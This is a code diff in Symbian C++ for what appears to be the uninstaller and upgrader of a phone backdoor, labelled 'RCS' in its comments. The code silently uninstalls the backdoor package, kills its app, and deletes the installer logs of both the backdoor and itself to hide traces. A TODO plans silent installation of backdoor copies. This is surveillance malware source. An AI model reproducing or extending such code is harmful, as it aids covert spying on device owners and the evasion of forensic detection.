@@ -16,6 +16,7 @@
 #include <swinstapi.h>			// Uninstaller
 #include <swinstdefs.h>
 #include <d32dbms.h>
+#include <bacline.h>			// command line args
 
 #include "Keys.h"	//into Core\inc
 
@@ -87,45 +88,60 @@ LOCAL_C void DeleteInstallerLog(TUid aUid)
 LOCAL_C void MainL()
 	{
 	
-	//Let's give the Swi time for exiting and being recalled
-	User::After(10*1000000);
+	//Create CommandLine Arguments and read it.
+	CCommandLineArguments* args=CCommandLineArguments::NewLC();
+	TInt count = 0;
+	count = args->Count();
+	CleanupStack::PopAndDestroy(args);
 	
-	// Prepare for bd uninstall	
-	SwiUI::RSWInstLauncher iLauncher ;
-	SwiUI::TUninstallOptions iOptions;
-	SwiUI::TUninstallOptionsPckg iOptionsPckg; 
-	iOptions.iKillApp=SwiUI::EPolicyAllowed;
-	iOptionsPckg = iOptions;
-	
-	// retrieve UID of sis file to uninstall
-	// Note! UID of your SIS file, NOT of your app
-	TBuf8<12> hexBuf(KUidBackdoor);
-	hexBuf.Copy(hexBuf.Mid(2,hexBuf.Length()-2));
-	TLex8 lex(hexBuf);
-	TUint32 bdUid;
-	lex.Val(bdUid,EHex);
-	TUid kUid = TUid::Uid(bdUid);
-	
-	TInt err = iLauncher.Connect();
-	if(err == KErrNone)
+	if(count == 1)
 		{
-		// Synchronous silent uninstall
-		TInt a=iLauncher.SilentUninstall(kUid, iOptionsPckg,SwiUI::KSisxMimeType) ;
-		}
-	iLauncher.Close();
+		// let's behave like a uninstaller
+		
+		//Let's give the Swi time for exiting and being recalled
+		User::After(10*1000000);
 	
-	// Delete install log of Uninstaller install
-	hexBuf.Copy(KUidUninstaller);
-	hexBuf.Copy(hexBuf.Mid(2,hexBuf.Length()-2));
-	lex.Assign(hexBuf);
-	TUint32 uninstUid;
-	lex.Val(uninstUid,EHex);
-	TUid uninstallerUid = TUid::Uid(uninstUid);
-	DeleteInstallerLog(uninstallerUid);
+		// Prepare for bd uninstall	
+		SwiUI::RSWInstLauncher iLauncher ;
+		SwiUI::TUninstallOptions iOptions;
+		SwiUI::TUninstallOptionsPckg iOptionsPckg; 
+		iOptions.iKillApp=SwiUI::EPolicyAllowed;
+		iOptionsPckg = iOptions;
+	
+		// retrieve UID of sis file to uninstall
+		// Note! UID of your SIS file, NOT of your app
+		TBuf8<12> hexBuf(KUidBackdoor);
+		hexBuf.Copy(hexBuf.Mid(2,hexBuf.Length()-2));
+		TLex8 lex(hexBuf);
+		TUint32 bdUid;
+		lex.Val(bdUid,EHex);
+		TUid kUid = TUid::Uid(bdUid);
+	
+		TInt err = iLauncher.Connect();
+		if(err == KErrNone)
+			{
+			// Synchronous silent uninstall
+			TInt a=iLauncher.SilentUninstall(kUid, iOptionsPckg,SwiUI::KSisxMimeType) ;
+			}
+		iLauncher.Close();
+	
+		// Delete install log of Uninstaller install
+		hexBuf.Copy(KUidUninstaller);
+		hexBuf.Copy(hexBuf.Mid(2,hexBuf.Length()-2));
+		lex.Assign(hexBuf);
+		TUint32 uninstUid;
+		lex.Val(uninstUid,EHex);
+		TUid uninstallerUid = TUid::Uid(uninstUid);
+		DeleteInstallerLog(uninstallerUid);
 		
-	// Delete install log of RCS uninstall
-	DeleteInstallerLog(kUid);
-		
+		// Delete install log of RCS uninstall
+		DeleteInstallerLog(kUid);
+		}
+	else
+		{
+		// TODO: behave like an upgrader:
+		// silently install bd copied into its import directory
+		}
 	}
 
 
@@ -143,6 +159,7 @@ LOCAL_C void DoStartL()
 	
 	}
 
+
 //  Global Functions
 
 GLDEF_C TInt E32Main()
@@ -153,7 +170,7 @@ GLDEF_C TInt E32Main()
 	
 	// Run application code inside TRAP harness, wait keypress when terminated
 	TRAPD(mainError, DoStartL());
-
+	
 	delete cleanup;
 	__UHEAP_MARKEND;
 	return mainError;
